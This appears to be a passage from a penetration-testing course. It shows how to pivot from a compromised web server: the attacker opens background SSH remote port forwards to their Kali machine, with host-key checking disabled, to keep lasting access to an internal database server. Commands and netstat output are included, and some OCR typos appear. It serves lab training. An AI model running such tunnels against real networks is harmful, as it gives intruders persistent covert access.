![](bbox=[0.13, 0.03, 0.31, 0.07])

Next, we want to ignore any commands the user supplies. This can be done with the command option in ssh. We also want to prevent agent and X11 forwarding with the no-agent-forwarding and no-X11-forwarding options. Finally, we want to prevent the user from being allocated a tty device with the no-tty option. The final ~/.ssh/authorized_keys file on Kali can be found in Listing 897.

```
from="10.11.1.250",command="echo 'This account can only be used for port forwarding'", no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAgQxC02TJEsuXiHqoUub4j9o/IPhxsPgi+fLFLPWK4n6pK02X5smFlHjAhyHUr4auFhSnF2gJhNaN2Z4DjkfZF950570X3m0oaEuGweHtZcwIMNLJiHzfS70blRg+Z23ka+jyM8ZtIO/ENC68Pj+NHtWic2So95AwAwC/Hkb7kZixNo6fervcgVaXykjWZc8BXxYkGdOLutSc58B++gh3sPOPI/DkOrS05/wJNCnB12L/ex/d021OmCLGeAzv2IIR9xk87xVdiih58By513s+2XOrHzabddS7MwgFz16Coo+bHbT86PFF9ZLZm9O/USZLoqHx57oXNq6LbLTra4I/MD n1nwe-datalaaja
```

Listing 897 ~/.ssh/authorized_keys file on Kali

This entry allows the owner of the private key (the web server) to log in to our Kali machine but prevents them from running commands and only allows for port forwarding.

Next, we need to add a couple more options to our ssh command to ensure that it will work. First we need to add the -N flag to specify that we are not running any commands. We also need the -f option to request ssh to go to the background. Finally, we also need to provide the key file that we are using via -i.

The final SSH command can be found in Listing 898.

```
ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/nu l" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4
```

Listing 898 Final iteration of ssh command

Finally, we need to run the SSH command in the metaspeterer shell.

```
ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/nul l" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4
Could not create directory '/var/www/.ssh'。
Warning: Permanently added '10.11.0.4'(ECDSA) to the list of known hosts.
```

Listing 899 Executing the final iteration of the ssh command

Now let’s verify that the ports are open on our Kali machine:

```
kali@kali:~$ sudo netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name
tcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN 1/systemd
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 645/sshd
tcp 0 0 127.0.0.1:13306 0.0.0.0:* LISTEN 91364/sshd: kali
tcp 0 0 127.0.0.1:1122 0.0.0.0:* LISTEN 91364/sshd: kali
tcp6 0 0 :::111 :::* LISTEN 1/systemd
tcp6 0 0 :::22 :::* LISTEN 645/sshd
tcp6 0 0 ::1:13306 :::* LISTEN 91364/sshd: kali
tcp6 0 0 ::1:1122 :::* LISTEN 91364/sshd: kali
```

Listing 900 Verifying open ports

At this point, since the ssh command was run in the background, even if our metaspeterer shell were to die, we would have remote access to the database server through the remote tunnel.